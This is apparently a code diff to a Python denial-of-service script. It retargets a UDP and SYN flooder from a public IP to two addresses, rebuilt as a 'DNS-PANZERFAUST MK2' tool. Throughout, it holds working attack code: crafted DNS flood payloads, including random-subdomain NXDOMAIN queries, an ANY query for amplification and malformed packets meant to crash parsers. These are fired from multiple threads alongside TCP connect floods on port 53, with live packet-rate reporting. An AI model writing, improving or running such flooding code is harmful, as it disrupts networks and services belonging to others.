@@ -2,105 +2,134 @@ import socket
 import threading
 import time
 import random
+import struct
 
-router_ip = "62.109.121.42"
+# 2x TARGETS
+targets = ["192.168.1.1", "192.168.1.100"]  # ROUTER + SECOND TARGET
 
-# Colors
-MAGENTA = '\033[95m'
 GREEN = '\033[92m'
 RED = '\033[91m'
+MAGENTA = '\033[95m'
+CYAN = '\033[96m'
+YELLOW = '\033[93m'
 RESET = '\033[0m'
 
-# Stats tracking
+# DNS PANZERFAUST MK2 PAYLOADS
+def panzer_payload_1(target):
+    """NXDOMAIN BOMBER"""
+    domain = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=15)) + '.com'
+    query = struct.pack('>HHHHHH', random.randint(1, 65535), 0x0100, 1, 0, 0, 0)
+    query += b''.join(struct.pack('B', len(part)) + part.encode() for part in domain.split('.'))[:-1]
+    query += b'\x00\x00\x01\x00\x01'
+    return query
+
+def panzer_payload_2(target):
+    """DNS AMPLIFICATION SIMULATION"""
+    return b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03isc\x03org\x00\x00\xff\x00\x01'
+
+def panzer_payload_3(target):
+    """CNAME CHAIN POISON"""
+    query = struct.pack('>HHHHHH', random.randint(1, 65535), 0x0100, 5, 0, 0, 0)
+    for i in range(5):
+        name = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=6))
+        query += struct.pack('B', len(name)) + name.encode()
+    query += b'\x00\x00\x05\x00\x01'
+    return query
+
+def panzer_payload_4(target):
+    """DNS TCP SESSION FLOOD"""
+    return b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01'
+
+def panzer_payload_5(target):
+    """MALFORMED DNS PARSER CRASH"""
+    return b'\xff' * 128
+
+PANZER_PAYLOADS = [panzer_payload_1, panzer_payload_2, panzer_payload_3, panzer_payload_4, panzer_payload_5]
+
+# Stats per target
 stats = {
-    "udp_sent": 0,
-    "syn_sent": 0,
-    "udp_data": 0,
-    "syn_data": 0,
-    "udp_success": 0,
-    "syn_success": 0,
-    "udp_fail": 0,
-    "syn_fail": 0
+    target: {"sent": 0, "data": 0, "success": 0}
+    for target in targets
 }
-stats_lock = threading.Lock()
+lock = threading.Lock()
 
-# UDP Attack
-def udp_attack():
+def panzer_attack(target_ip):
+    """PANZERFAUST attack thread per target"""
     while True:
         try:
+            payload_func = random.choice(PANZER_PAYLOADS)
+            payload = payload_func(target_ip)
+            
+            # UDP DNS FLOOD
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            payload = random.randbytes(random.randint(500, 1450))
-            port = random.randint(1, 65535)
-            
-            sock.sendto(payload, (router_ip, port))
-            data_sent = len(payload)
-            
-            with stats_lock:
-                stats["udp_sent"] += 1
-                stats["udp_data"] += data_sent
-                stats["udp_success"] += 1
+            for _ in range(150):  # BATCH
+                sock.sendto(payload, (target_ip, 53))
+                
+                with lock:
+                    stats[target_ip]["sent"] += 1
+                    stats[target_ip]["data"] += len(payload)
+                    stats[target_ip]["success"] += 1
             sock.close()
             
+            # TCP DNS SYNs
+            for _ in range(50):
+                try:
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    sock.settimeout(0.01)
+                    sock.connect_ex((target_ip, 53))
+                    sock.close()
+                    
+                    with lock:
+                        stats[target_ip]["sent"] += 1
+                        stats[target_ip]["data"] += 64
+                except:
+                    pass
+                    
         except:
-            with stats_lock:
-                stats["udp_fail"] += 1
+            pass
+        
+        time.sleep(random.uniform(0.01, 0.05))
 
-# SYN Attack  
-def syn_attack():
-    while True:
-        try:
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(0.01)
-            port = random.randint(1, 65535)
-            
-            result = sock.connect_ex((router_ip, port))
-            with stats_lock:
-                stats["syn_sent"] += 1
-                stats["syn_data"] += 64
-                if result == 0:
-                    stats["syn_success"] += 1
-                else:
-                    stats["syn_fail"] += 1
-            sock.close()
-            
-        except:
-            with stats_lock:
-                stats["syn_fail"] += 1
+# Start PANZERFAUST on both targets
+for target in targets:
+    for _ in range(3):  # 3 threads per target
+        threading.Thread(target=panzer_attack, args=(target,), daemon=True).start()
 
-# Start 6 UDP threads
-for _ in range(6):
-    threading.Thread(target=udp_attack, daemon=True).start()
+print(f"{MAGENTA}╔══════════════════════════════════════╗{RESET}")
+print(f"{MAGENTA}║      {RED}DNS-PANZERFAUST MK2{RESET} {MAGENTA}     ║{RESET}")
+print(f"{MAGENTA}║      {CYAN}DUAL TARGET MODE{RESET} {MAGENTA}       ║{RESET}")
+print(f"{MAGENTA}╚══════════════════════════════════════╝{RESET}")
+print()
 
-# Start 4 SYN threads
-for _ in range(4):
-    threading.Thread(target=syn_attack, daemon=True).start()
-
-# Logging every 10s
 last_time = time.time()
 while True:
-    time.sleep(0.1)
-    current_time = time.time()
+    time.sleep(5)
     
-    if current_time - last_time >= 10:
-        with stats_lock:
-            total_sent = stats["udp_sent"] + stats["syn_sent"]
-            total_data = stats["udp_data"] + stats["syn_data"]
-            total_success = stats["udp_success"] + stats["syn_success"]
-            total_fail = stats["udp_fail"] + stats["syn_fail"]
+    with lock:
+        total_sent = 0
+        total_data = 0
+        
+        print(f"{CYAN}╔══════════════════════════════════════╗{RESET}")
+        for i, target in enumerate(targets):
+            sent = stats[target]["sent"]
+            data_mb = stats[target]["data"] / (1024 * 1024)
             
-            data_mb = total_data / (1024 * 1024)
-            pps = total_sent // 10
+            total_sent += sent
+            total_data += stats[target]["data"]
             
-            print(f"{MAGENTA}2M50{RESET}:{GREEN}{total_sent}{RESET}:{GREEN}{data_mb:.2f}MB{RESET} ---> ({GREEN}{total_success}{RESET},{RED}{total_fail}{RESET})")
+            # Reset for next interval
+            stats[target]["sent"] = 0
+            stats[target]["data"] = 0
+            stats[target]["success"] = 0
             
-            # Reset counters
-            stats["udp_sent"] = 0
-            stats["syn_sent"] = 0
-            stats["udp_data"] = 0
-            stats["syn_data"] = 0
-            stats["udp_success"] = 0
-            stats["syn_success"] = 0
-            stats["udp_fail"] = 0
-            stats["syn_fail"] = 0
-            
-        last_time = current_time
+            color = YELLOW if i == 0 else RED
+            print(f"{CYAN}║{RESET} {color}TARGET {i+1}: {target:21}{RESET}{CYAN}║{RESET}")
+            print(f"{CYAN}║{RESET} PPS: {GREEN}{sent}{RESET} | DATA: {GREEN}{data_mb:.2f}MB{RESET}      {CYAN}║{RESET}")
+        
+        total_data_mb = total_data / (1024 * 1024)
+        print(f"{CYAN}╠══════════════════════════════════════╣{RESET}")
+        print(f"{CYAN}║{RESET} TOTAL: {GREEN}{total_sent}{RESET} | {GREEN}{total_data_mb:.2f}MB{RESET}         {CYAN}║{RESET}")
+        print(f"{CYAN}╚══════════════════════════════════════╝{RESET}")
+        print()
+    
+    last_time = time.time()
